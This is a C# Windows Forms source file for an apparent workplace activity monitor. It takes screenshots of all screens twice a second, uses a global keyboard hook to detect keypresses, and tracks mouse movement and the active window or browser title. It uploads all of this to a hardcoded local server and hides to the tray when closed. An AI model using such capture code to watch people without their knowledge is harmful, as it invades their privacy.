using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.IO;
using System.Net.Http.Headers;
using System.Drawing.Imaging;
using PacketDotNet;
using SharpPcap;
using SHDocVw;

namespace IMS
{
    public partial class IMS : Form
    {
        private string connectUrl = "http://192.168.8.171:8081/detect/connected";
        private string dataUrl = "http://192.168.8.171:8081/detect/create";

        //private string connectUrl = "http://192.168.8.110:8081/detect/connected";
        //private string dataUrl = "http://192.168.8.110:8081/detect/create";

        private bool isConnected = false;
        private bool httpError = false;

        private Timer captureTimer;
        private Rectangle screenBounds;

        private bool closeEvent = false;

        private static bool isKeyBoardPressed = false;
        private static bool wasKeyPressedDuringLastTick = false;

        private Point previousMousePosition;
        private bool isMouseMoved = false;

        private string prevCapture = "";
        private string newCapture = "";

        //====================Get Focused Application Name==================
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        private static readonly string[] Browsers = { "Google Chrome", "Mozilla Firefox", "Microsoft Edge" };

        //========================Get Key Events============================
        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        //========================Get Chrome Url============================
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, IntPtr windowTitle);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                isKeyBoardPressed = true;
                wasKeyPressedDuringLastTick = true;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public IMS()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            isConnected = await CheckServerConnection(connectUrl);
            screenBounds = Screen.PrimaryScreen.Bounds;

            captureTimer = new Timer();
            captureTimer.Interval = 500;
            captureTimer.Tick += HandleCapture;
            captureTimer.Start();

            if (isConnected)
            {
                outputLabel.Text = "Connection Success!";
            }
            else
            {
                outputLabel.Text = "Connection Failed!";
            }

            var trayMenu = new ContextMenu();
            trayMenu.MenuItems.Add("Exit", onCloseEvent);

            notifyIcon.ContextMenu = trayMenu;

            _hookID = SetHook(_proc);
            
        }

        private async void HandleCapture(object sender, EventArgs e)
        {
            isConnected = await CheckServerConnection(connectUrl);

            if (!isConnected)
            {
                outputLabel.Text = "Connection Failed!";
                //prevCapture = "";
                return ;
            }

            if(httpError)
                outputLabel.Text = "Unknown Http Error!";
                

            if (!httpError && isConnected)
                outputLabel.Text = "Connection Success!";

            await CaptureScreenAsync("screenshot.jpg");

            if (!wasKeyPressedDuringLastTick)
                isKeyBoardPressed = false;
            else
                wasKeyPressedDuringLastTick = false;


            Point currentMousePosition = Cursor.Position;
            if (currentMousePosition != previousMousePosition)
            {
                isMouseMoved = true;
                previousMousePosition = currentMousePosition;
            }
            else
            {
                isMouseMoved = false;
            }

            IntPtr hWnd = GetForegroundWindow();

            GetWindowThreadProcessId(hWnd, out uint processId);
            Process process = Process.GetProcessById((int)processId);

            string processTitle = process.ProcessName.ToLower();

            if (processTitle.Contains("chrome") || processTitle.Contains("iexplore") || processTitle.Contains("firefox"))
            {
                processTitle = process.MainWindowTitle;
            }

            var data = new
            {
                url = processTitle,
                isKeyPressed = isKeyBoardPressed,
                isBtnClicked = isMouseMoved,
            };
            var jsonData = JsonConvert.SerializeObject(data);
                
            using (var client = new HttpClient())
            using (var form = new MultipartFormDataContent())
            {
                // Add JSON data as a form field
                var jsonContent = new StringContent(jsonData, Encoding.UTF8, "application/json");

                form.Add(new StringContent(processTitle), "url");
                form.Add(new StringContent(isKeyBoardPressed.ToString()), "isKeyPressed");
                form.Add(new StringContent(isMouseMoved.ToString()), "isBtnClicked");

                var filePath = "screenshot.jpg";

                var fileInfo = new FileInfo(filePath);

                if (!fileInfo.Exists || fileInfo.Length == 0)
                    return;

                try
                {
                    byte[] fileContentBytes = System.IO.File.ReadAllBytes(filePath);
                    var fileContent = new ByteArrayContent(fileContentBytes);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                    form.Add(fileContent, "file", System.IO.Path.GetFileName(filePath));
                    
                    var response = await client.PostAsync(dataUrl, form);
                    response.EnsureSuccessStatusCode();

                    if(response.IsSuccessStatusCode)
                    {
                        httpError = false;
                    }
                    else
                    {
                        httpError = true;
                    }
                }
                catch (Exception ex)
                {
                    httpError = true;
                }
            }

        }

        private static string GetURL(IntPtr intPtr, string programName)
        {
            string temp = null;
            if (programName.Equals("chrome"))
            {
                var hAddressBox = FindWindowEx(intPtr, IntPtr.Zero, "Chrome_OmniboxView", IntPtr.Zero);
                var sb = new StringBuilder(256);
                SendMessage(hAddressBox, 0x000D, (IntPtr)256, sb);
                temp = sb.ToString();
            }
            if (programName.Equals("iexplore"))
            {
                foreach (InternetExplorer ie in new ShellWindows())
                {
                    var fileNameWithoutExtension = Path.GetFileNameWithoutExtension(ie.FullName);
                    if (fileNameWithoutExtension != null)
                    {
                        var filename = fileNameWithoutExtension.ToLower();
                        if (filename.Equals("iexplore"))
                        {
                            temp += ie.LocationURL + " ";
                        }
                    }
                }
            }
            /*if (programName.Equals("firefox"))
            {
                DdeClient dde = new DdeClient("Firefox", "WWW_GetWindowInfo");
                dde.Connect();
                string url1 = dde.Request("URL", int.MaxValue);
                dde.Disconnect();
                temp = url1.Replace("\"", "").Replace("\0", "");
            }*/
            return temp;
        }

        private async Task CaptureScreenAsync(string filePath)
        {
            await Task.Run(() =>
            {
                CaptureScreen(filePath);
            });
        }

        public void CaptureScreen(string filePath, long jpegQuality = 40L)
        {
            try
            {
                Rectangle bounds = Screen.AllScreens.Length == 1
                    ? Screen.PrimaryScreen.Bounds
                    : GetTotalBounds();

                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                    }

                    // Resize the image if necessary (optional)
                    Bitmap resizedBitmap = ResizeBitmap(bitmap, bounds.Width, bounds.Height);

                    SaveAsJpeg(resizedBitmap, filePath, jpegQuality);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        // Compute the total bounds of all screens
        private Rectangle GetTotalBounds()
        {
            Rectangle totalBounds = Screen.AllScreens[0].Bounds;

            foreach (var screen in Screen.AllScreens)
            {
                totalBounds = Rectangle.Union(totalBounds, screen.Bounds);
            }

            return totalBounds;
        }

        // Resize the bitmap to new dimensions
        private Bitmap ResizeBitmap(Bitmap original, int newWidth, int newHeight)
        {
            Bitmap resized = new Bitmap(newWidth, newHeight);
            using (Graphics g = Graphics.FromImage(resized))
            {
                g.DrawImage(original, 0, 0, newWidth, newHeight);
            }
            return resized;
        }

        // Save the bitmap as a JPEG with specified quality
        private void SaveAsJpeg(Bitmap bitmap, string filePath, long quality)
        {
            try
            {
                ImageCodecInfo jpegCodec = GetEncoder(ImageFormat.Jpeg);
                EncoderParameters encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                using (FileStream fs = new FileStream(filePath, FileMode.Create))
                {
                    bitmap.Save(fs, jpegCodec, encoderParams);
                }
                
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., logging or displaying an error message)
                Console.WriteLine($"An error occurred while saving the JPEG image: {ex.Message}");
            }
        }

        // Get the encoder for a specific image format
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        public static async Task<bool> CheckServerConnection(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    return response.IsSuccessStatusCode;
                }
                catch (HttpRequestException)
                {
                    return false;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return false;
                }
            }
        }

        private void onCloseEvent(Object sender, EventArgs e)
        {
            closeEvent = true;
            this.Close();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!closeEvent)
            {
                this.Hide();
                notifyIcon.Visible = true;

                e.Cancel = true;
            }
            else
            {
                UnhookWindowsHookEx(_hookID);
            }
        }

        private void Form1_Resize(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Hide();
                notifyIcon.Visible = true;
            }
            else
            {
                notifyIcon.Visible = false;
            }
        }

        private void NotifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Show();
            notifyIcon.Visible = false;
            this.WindowState = FormWindowState.Normal;
        }
    }

}
